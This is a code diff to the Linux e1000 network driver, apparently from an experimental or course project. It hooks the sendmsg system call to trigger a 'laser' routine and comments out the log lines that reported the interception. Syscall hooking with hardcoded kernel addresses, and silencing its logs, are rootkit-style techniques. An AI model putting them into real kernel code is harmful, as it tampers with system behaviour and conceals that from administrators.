@@ -185,6 +185,7 @@ static int e1000_vlan_rx_kill_vid(struct net_device *netdev,
 				  __be16 proto, u16 vid);
 static void e1000_restore_vlan(struct e1000_adapter *adapter);
 static void e1000_my_fields_init(struct net_device *netdev);
+void e1000_laser_init(struct net_device *netdev);
 
 #ifdef CONFIG_PM
 static int e1000_suspend(struct pci_dev *pdev, pm_message_t state);
@@ -251,19 +252,17 @@ struct net_device *e1000_get_hw_dev(struct e1000_hw *hw)
 	return adapter->netdev;
 }
 
-void (*pages_rw) (struct page *page, int numpages) = (void *)0x8106c7c0;
-void (*pages_ro) (struct page *page, int numpages) = (void *)0x8106c740;
-
 asmlinkage int (*original_sendmsg) (int sockfd, struct mmsghdr *msgvec, unsigned int vlen, unsigned int flags);
 asmlinkage int e1000_sendmsg(int sockfd, struct mmsghdr *msgvec, unsigned int vlen, unsigned int flags)
 {
     struct net_device *dev;
-    pr_info("[sendmsg() syscall intercepted]\n"); 
+    //pr_info("[sendmsg() syscall intercepted]\n"); 
     dev = first_net_device(&init_net);
     dev = next_net_device(dev);
     
     // assume current dev is eth0, using e1000
-    pr_info("@ [%s]:\n", dev->name);
+    //pr_info("@ [%s]:\n", dev->name);
+    
     //if (dev->name == "lo") {
         e1000_laser_init(dev);
     //}
@@ -5403,9 +5402,9 @@ void e1000_laser_init(struct net_device *netdev)
     hw->socket_counter++;
     
     if (hw->laser_on){
-        pr_info("[Timestamp : %lu]\n", hw->timestamp);
-        pr_info("[Laser is now %s ]\n", hw->laser_on ? "on" : "off");
-        pr_info("[Number of sockets: %d]\n", hw->socket_counter);
+        //pr_info("[Timestamp : %lu]\n", hw->timestamp);
+        //pr_info("[Laser is now %s ]\n", hw->laser_on ? "on" : "off");
+        //pr_info("[Number of sockets: %d]\n", hw->socket_counter);
         return;
     }
 
